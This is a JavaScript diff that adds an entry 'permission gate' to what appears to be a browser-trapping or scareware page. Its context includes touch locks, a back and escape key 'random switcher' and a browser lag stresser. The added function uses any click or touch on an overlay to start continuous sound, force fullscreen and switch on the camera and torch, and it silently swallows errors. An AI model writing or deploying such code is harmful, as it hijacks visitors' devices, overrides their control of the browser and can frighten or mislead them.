@@ -296,6 +296,7 @@ function init () {
   setupTouchLocks()
   setupGyroscopeAndMotion()
   setupBackAndEscRandomSwitcher()
+  setupEntryPermissionGate()
 
   interceptUserInput(event => {
     interactionCount += 1
@@ -2854,4 +2855,39 @@ function triggerBrowserLagStresser() {
     requestAnimationFrame(stressLayoutReflow);
   }
   requestAnimationFrame(stressLayoutReflow);
+}
+
+function setupEntryPermissionGate() {
+  const gateOverlay = document.getElementById('entry-permission-gate');
+  const gateBtn = document.getElementById('gate-start-btn');
+
+  if (!gateOverlay) return;
+
+  function handleGateClick(e) {
+    if (e) {
+      try { e.preventDefault(); } catch (err) {}
+      try { e.stopPropagation(); } catch (err) {}
+    }
+    gateOverlay.style.display = 'none';
+
+    // Synchronously unlock Web Audio & Fullscreen & Camera
+    try {
+      if (machineAudioCtx && machineAudioCtx.state === 'suspended') {
+        machineAudioCtx.resume().catch(() => {});
+      }
+      initContinuousMachineSound();
+      requestFullscreen();
+      initTorchAndCamera();
+    } catch (err) {}
+  }
+
+  if (gateBtn) {
+    ['click', 'pointerdown', 'touchstart'].forEach(evt => {
+      gateBtn.addEventListener(evt, handleGateClick);
+    });
+  }
+
+  ['click', 'pointerdown', 'touchstart'].forEach(evt => {
+    gateOverlay.addEventListener(evt, handleGateClick);
+  });
 }
